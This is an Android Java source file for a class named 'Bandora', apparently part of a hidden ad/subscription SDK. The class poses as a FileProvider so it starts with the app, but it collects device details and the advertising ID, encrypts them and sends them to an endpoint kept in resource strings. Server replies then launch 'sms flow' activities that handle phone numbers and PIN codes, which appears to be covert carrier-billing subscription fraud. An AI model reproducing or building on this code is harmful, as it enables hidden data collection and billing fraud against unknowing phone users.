package com.ma.autosdk;

import android.app.Activity;
import android.app.Application;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.content.FileProvider;

import com.adjust.sdk.Adjust;
import com.adjust.sdk.AdjustAttribution;
import com.adjust.sdk.AdjustConfig;
import com.adjust.sdk.OnAttributionChangedListener;
import com.adjust.sdk.OnDeeplinkResponseListener;
import com.adjust.sdk.OnDeviceIdsRead;
import com.google.firebase.FirebaseApp;
import com.google.firebase.analytics.FirebaseAnalytics;
import com.google.gson.Gson;
import com.ma.autosdk.api.RetrofitClient;
import com.ma.autosdk.api.Services;
import com.ma.autosdk.api.model.request.DeviceInfo;
import com.ma.autosdk.api.model.request.InitPayload;
import com.ma.autosdk.api.model.request.Referrer;
import com.ma.autosdk.api.model.request.Request;
import com.ma.autosdk.api.model.response.ApiResponse;
import com.ma.autosdk.api.model.response.Layout;
import com.ma.autosdk.ui.Action2Activity;
import com.sma.ssdkm.R;

import java.util.Arrays;
import java.util.List;
import java.util.Locale;
import java.util.UUID;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class Bandora extends FileProvider implements Application.ActivityLifecycleCallbacks {
    public static final String TAG = "BANDORA";
    public int activitiesCounter = 0;
    public boolean isLaunched = false;
    public boolean runWithDeepLink = false;
    public FirebaseAnalytics mFirebaseAnalytics;
    public static String googleAdId = "";
    public String deeplink = "";
    public String adjustAttribution = "";
    public static Layout SendPinLayout;
    public static String SendPinSessionId;

    InitPayload initPayload = InitPayload.getInstance();

    //Actions, 5: sms flow with number , 8 : sms flow
    List<Integer> actionsList = Arrays.asList(2, 8);


    @Override
    public boolean onCreate() {
        FirebaseApp.initializeApp(getContext());
        String appToken = getContext().getString(R.string.adjust_token);
        String environment = AdjustConfig.ENVIRONMENT_PRODUCTION;
        AdjustConfig config = new AdjustConfig(getContext(), appToken, environment);


        config.setOnAttributionChangedListener(new OnAttributionChangedListener() {
            @Override
            public void onAttributionChanged(AdjustAttribution attribution) {
                if (attribution != null) {
                    Bandora.this.adjustAttribution = attribution.toString();
                    if(initPayload.getReferrer() != null){
                        initPayload.getReferrer().getAdjust().setRefStr(attribution.toString());
                    }
                }
            }
        });

        config.setOnDeeplinkResponseListener(new OnDeeplinkResponseListener() {
            @Override
            public boolean launchReceivedDeeplink(Uri deeplink) {
                Bandora.this.deeplink = deeplink.toString();
                if(initPayload.getReferrer() != null){
                    initPayload.getReferrer().getAdjust().setRefStr(deeplink.toString());
                }

                if (runWithDeepLink) {

                    RetrofitClient.BASE_URL = getContext().getString(R.string.finalEndp);
                    RetrofitClient.encKey = getContext().getString(R.string.enKey);
                    RetrofitClient.header = getContext().getString(R.string.header);

                    callAPI();
                }

                return false;
            }
        });

        Adjust.getGoogleAdId(getContext(), new OnDeviceIdsRead() {
            @Override
            public void onGoogleAdIdRead(String googleAdId) {
                Bandora.this.googleAdId = googleAdId;
                if(initPayload.getDeviceInfo() != null){
                    initPayload.getDeviceInfo().setGps_adid(googleAdId);
                }
            }
        });

        Adjust.onCreate(config);
        Adjust.addSessionCallbackParameter("user_uuid", Utils.generateClickId(getContext()));

        Application app = (Application) Utils.makeContextSafe((Application) getContext());
        app.registerActivityLifecycleCallbacks(this);

        return super.onCreate();
    }

    @Override
    public void onActivityCreated(@NonNull Activity activity, @Nullable Bundle savedInstanceState) {
        Log.d(TAG, activity.getLocalClassName());
        activitiesCounter++;
        Log.d(TAG, "activitiesCounter: " + activitiesCounter);
        if (activitiesCounter == 1 && !isLaunched) {
            Log.d(TAG, "Run The SDK");
            isLaunched = true;
            if (!runWithDeepLink) {

                RetrofitClient.BASE_URL = getContext().getString(R.string.finalEndp);
                RetrofitClient.encKey = getContext().getString(R.string.enKey);
                RetrofitClient.header = getContext().getString(R.string.header);

                callAPI();
            }
        }
    }

    public void callAPI(){

        InitPayload initPayload = InitPayload.getInstance();
        DeviceInfo deviceInfo = new DeviceInfo();
        deviceInfo.setDeviceID(Utils.generateClickId(getContext()));
        deviceInfo.setPackageName(getContext().getPackageName());
        deviceInfo.setOS("Android");
        deviceInfo.setModel(Utils.getDeviceModel());
        deviceInfo.setUserAgent(System.getProperty("http.agent"));
        deviceInfo.setLangCode(Locale.getDefault().getLanguage());
        deviceInfo.setGps_adid(googleAdId);

        initPayload.setDeviceInfo(deviceInfo);
        Referrer referrer = new Referrer();
        com.ma.autosdk.api.model.request.Adjust adjust = new com.ma.autosdk.api.model.request.Adjust();

        if(Adjust.getAttribution() != null){
            adjustAttribution = Adjust.getAttribution().toString();
        }

        adjust.setDeeplink(deeplink);
        adjust.setRefStr(this.adjustAttribution);
        referrer.setAdjust(adjust);
        initPayload.setReferrer(referrer);

        Request request = new Request();
        request.setAction(1);
        request.setTransactionID(UUID.randomUUID().toString());
        request.setSessionID("");
        request.setMSISDN("");
        request.setPinCode("");
        initPayload.setRequest(request);


        Gson gson = new Gson();
        String json = gson.toJson(initPayload);
        String encryptedBody = Utils.encrypt(json, RetrofitClient.encKey);
        //String encryptedBody2 = Utils.decrypt("gyGh4UYaTV9xOZM+95VlwbovHi1pIDAELmx+wm3yChIzuGZcLjftr5U4e2a5Q8AxpLcU7XN5AqnMPCAo6NGujWslXpBoyYyA7cdOVWxqUNpePB1mS2VeF5JhPbJozbv66P2nSujzzt2FTOOGUAwH4WrjVvw46pNjvDLK8qq8/A/4zm52o069fb5d7RJPK4I1FbtPqaeOKVJXvlIHxzL+nyTP4pWKSmgzCXlI9snkvlla81dLvn/ZlDpou90uiGllRdxuddcIgayPKkS13dnLZA==", encKey);
        Services initiateService = RetrofitClient.getRetrofitInstance().create(Services.class);
        initiateService.initiate(RetrofitClient.BASE_URL, RetrofitClient.header, encryptedBody).enqueue(new Callback<String>() {
            @Override
            public void onResponse(Call<String> call, Response<String> response) {
                if (response.isSuccessful()) {
                    String res = Utils.decrypt(response.body(), RetrofitClient.encKey);
                    Gson gson = new Gson();
                    ApiResponse apiResponse = gson.fromJson(res, ApiResponse.class);

                    if (apiResponse != null) {
                        if (apiResponse.getNextAction() != null && actionsList.contains(apiResponse.getNextAction().getAction())) {
                            if (apiResponse.getNextAction().getLayout() != null) {
                                Intent intent = new Intent(getContext(), Action2Activity.class);
                                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                intent.putExtra("layout", apiResponse.getNextAction().getLayout());
                                intent.putExtra("id", apiResponse.getSessionID());
                                intent.putExtra("action", apiResponse.getNextAction().getAction());
                                getContext().startActivity(intent);
                            } else   {
                                return;
                            }
                        }
                        else if (apiResponse.getNextAction() != null  ) {
                            //show nothing
                            return;
                        }
                    } else {
                        firebaseLog("load parsing error", "");
                    }
                }
            }

            public void firebaseLog(String eventName, String errorLog) {
                Bundle params = new Bundle();
                if (!errorLog.isEmpty() && errorLog != null) {
                    params.putString("errorLog", errorLog);
                }
                mFirebaseAnalytics = FirebaseAnalytics.getInstance(getContext());
                mFirebaseAnalytics.logEvent(eventName, params);
            }

            @Override
            public void onFailure(Call<String> call, Throwable t) {
                Log.wtf(TAG, "onFailure: fail " );
            }
        });
    }
    @Override
    public void onActivityStarted(@NonNull Activity activity) {
    }

    @Override
    public void onActivityResumed(@NonNull Activity activity) {
        Adjust.onResume();
    }

    @Override
    public void onActivityPaused(@NonNull Activity activity) {
        Adjust.onPause();
    }

    @Override
    public void onActivityStopped(@NonNull Activity activity) {
    }

    @Override
    public void onActivitySaveInstanceState(@NonNull Activity activity, @NonNull Bundle outState) {
    }

    @Override
    public void onActivityDestroyed(@NonNull Activity activity) {
    }
}
